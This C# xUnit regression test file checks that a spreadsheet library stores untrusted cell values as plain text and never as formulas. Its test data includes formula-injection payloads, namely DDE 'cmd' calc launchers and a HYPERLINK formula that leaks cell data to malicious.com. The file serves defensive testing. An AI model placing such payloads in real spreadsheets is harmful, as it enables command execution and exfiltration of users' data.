using System.IO;
using System.Linq;
using DocumentFormat.OpenXml.Packaging;
using DocumentFormat.OpenXml.Spreadsheet;
using Conq.Noble.Spreadox;
using Xunit;
using Xunit.Abstractions;

namespace Conq.Noble.Spreadox.Tests;

public class FormulaInjectionRegressionTests
{
    private readonly ITestOutputHelper _output;

    public FormulaInjectionRegressionTests(ITestOutputHelper output)
    {
        _output = output;
    }

    [Theory]
    [InlineData("=cmd|' /C calc'!A0")]
    [InlineData("+cmd|' /C calc'!A0")]
    [InlineData("-cmd|' /C calc'!A0")]
    [InlineData("@SUM(1+1)*cmd|' /C calc'!A0")]
    [InlineData("   =1+1")]
    [InlineData("\t=1+1")]
    [InlineData("\r\n=1+1")]
    [InlineData("=HYPERLINK(\"http://malicious.com?leak=\"&A1, \"Click\")")]
    public void UntrustedStringValue_RemainsPureTextAndNeverProducesFormulaTag_InDom(string payload)
    {
        using var ms = new MemoryStream();
        using (var wb = ExcelWorkbook.Create())
        {
            var sheet = wb.Worksheets[0];
            sheet["A1"].SetValue(payload);
            wb.Save(ms);
        }

        ms.Position = 0;
        using (var doc = SpreadsheetDocument.Open(ms, false))
        {
            var wsPart = doc.WorkbookPart!.WorksheetParts.First();
            var cell = wsPart.Worksheet.Descendants<Cell>().First(c => c.CellReference == "A1");

            // Invariant: Cell MUST NOT contain a <f> (CellFormula) element
            Assert.Null(cell.CellFormula);

            // Invariant: Cell MUST be stored as string data type (SharedString in DOM)
            Assert.Equal(CellValues.SharedString, cell.DataType?.Value);
        }

        // Verify round-trip preserves literal text
        ms.Position = 0;
        using (var reloaded = ExcelWorkbook.Open(ms))
        {
            Assert.Null(reloaded.Worksheets[0]["A1"].Formula);
            Assert.Equal(payload.Replace("\r\n", "\n"), reloaded.Worksheets[0]["A1"].GetString());
        }
    }

    [Theory]
    [InlineData("=cmd|' /C calc'!A0")]
    [InlineData("+cmd|' /C calc'!A0")]
    [InlineData("-cmd|' /C calc'!A0")]
    [InlineData("@SUM(1+1)")]
    [InlineData("\t=1+1")]
    public void UntrustedStringValue_RemainsPureTextAndNeverProducesFormulaTag_InStreaming(string payload)
    {
        using var ms = new MemoryStream();
        using (var sw = ExcelStreamingWorkbook.Create(ms, new ExcelStreamingOptions { UseInlineStrings = true }))
        {
            var sheet = sw.AddWorksheet("Security");
            sheet.WriteRow(1, row =>
            {
                row.Text(1, payload);
            });
        }

        ms.Position = 0;
        using (var doc = SpreadsheetDocument.Open(ms, false))
        {
            var wsPart = doc.WorkbookPart!.WorksheetParts.First();
            var cell = wsPart.Worksheet.Descendants<Cell>().First(c => c.CellReference == "A1");

            // Invariant: Cell MUST NOT contain a <f> (CellFormula) element
            Assert.Null(cell.CellFormula);

            // Invariant: Streaming inline string uses DataType = InlineString
            Assert.Equal(CellValues.InlineString, cell.DataType?.Value);
            var inlineText = cell.InlineString?.Text?.Text;
            Assert.NotNull(inlineText);
            // Payload is preserved as text
            Assert.Contains(payload.Trim(), inlineText);
        }
    }

    [Fact]
    public void IntentionalFormulas_ExplicitlyInvoked_RemainFunctionalAndProduceFormulaTag()
    {
        using var ms = new MemoryStream();
        using (var wb = ExcelWorkbook.Create())
        {
            var sheet = wb.Worksheets[0];
            sheet["A1"].SetValue(100);
            sheet["A2"].SetValue(200);
            sheet.SetFormula("A3", "SUM(A1:A2)", cachedValue: 300);
            wb.Save(ms);
        }

        ms.Position = 0;
        using (var doc = SpreadsheetDocument.Open(ms, false))
        {
            var wsPart = doc.WorkbookPart!.WorksheetParts.First();
            var cellA3 = wsPart.Worksheet.Descendants<Cell>().First(c => c.CellReference == "A3");

            Assert.NotNull(cellA3.CellFormula);
            Assert.Equal("SUM(A1:A2)", cellA3.CellFormula!.Text);
            Assert.Equal("300", cellA3.CellValue?.Text);
        }

        ms.Position = 0;
        using (var reloaded = ExcelWorkbook.Open(ms))
        {
            Assert.Equal("SUM(A1:A2)", reloaded.Worksheets[0]["A3"].Formula);
            Assert.Equal(300, reloaded.Worksheets[0]["A3"].GetInt());
        }

        _output.WriteLine("Formula injection regression tests passed: untrusted values remain text, intentional formulas functional.");
    }
}
